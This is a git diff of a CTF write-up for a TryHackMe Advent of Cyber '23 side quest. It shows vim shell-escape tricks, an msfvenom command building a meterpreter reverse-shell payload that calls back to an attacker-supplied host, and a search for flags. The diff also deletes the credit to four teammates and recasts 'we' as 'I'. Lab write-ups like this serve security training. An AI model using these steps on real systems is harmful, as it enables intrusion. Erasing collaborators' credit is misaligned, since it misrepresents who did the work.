@@ -1,6 +1,4 @@
-# Frosteau Busy With Vim (THM Advent of Cyber '23 Side Quest 3 Difficulty: Insane)
-
-This was a team effort with 4 other THM Discord members. 
+# Frosteau Busy With Vim (THM Advent of Cyber '23 Side Quest 3 Difficulty: Insane) 
 
 ## Finding the QR Code
 
@@ -88,15 +86,15 @@ Things found within vim:
 -If you exit vim you are kicked out of the connection.
 -You can see the directories inside vim using `:e /` then `:e /directory_name`.
 -Trying to run commands using :! from vim gives an error `Cannot execute shell /tmp/sh`. 
--After looking through many files and directories we determined that /tmp/sh was empty and not executable. 
+-After looking through many files and directories I determined that /tmp/sh was empty and not executable. 
 -There is also a user frosty that has /usr/frosty/sh that is empty but is executable. We might be able to use that to get a shell.
 -If you go to the /home directory you will find the user ubuntu.
--We tried all kinds of shells in vim but didn't have any luck.
--We can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
+-I tried all kinds of shells in vim but didn't have any luck.
+-I can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
 -`:e /etc/shells` gives us `/usr/busybox/sh`.
 -It seems the 8065 port points to `/usr/frosty/sh`.
 ```
-At this point we decided to try a reverse shell using metasploit in order to get a prompt outside of vim.
+At this point I decided to try a reverse shell using metasploit in order to get a prompt outside of vim.
 ```
 -Create your payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload.elf`.
 -Start your listener in `msfconsole` and use `payload/linux/x64/meterpreter/reverse_tcp`, then `set hosts YOUR_IP`.
@@ -110,20 +108,20 @@ At this point we decided to try a reverse shell using metasploit in order to get
 
 You now have a shell. 
 
-Searching for .txt files gives us the third flag, `/root/flag-3-of-4.txt`.
+Searching for .txt files gives you the third flag, `/root/flag-3-of-4.txt`.
 
 
 <p align="left">
   <img height=500 img src=./readme_assets/flag3.PNG/>
 </p>
 
-After a LOT more searching we determined that there must be another docker container we have to access. Doing a process search for dockerd shows us another user besides ubuntu with dockerd, root.
+After a LOT more searching I determined that there must be another docker container we have to access. Doing a process search for dockerd shows you another user besides ubuntu with dockerd, root.
 
 <p align="left">
   <img height=200 img src=./readme_assets/root.PNG/>
 </p>
 
-With this information we were able to find flag 4 and yetikey3.
+With this information I was able to find flag 4 and yetikey3.
 
 <p align="left">
   <img height=500 img src=./readme_assets/files.PNG/>
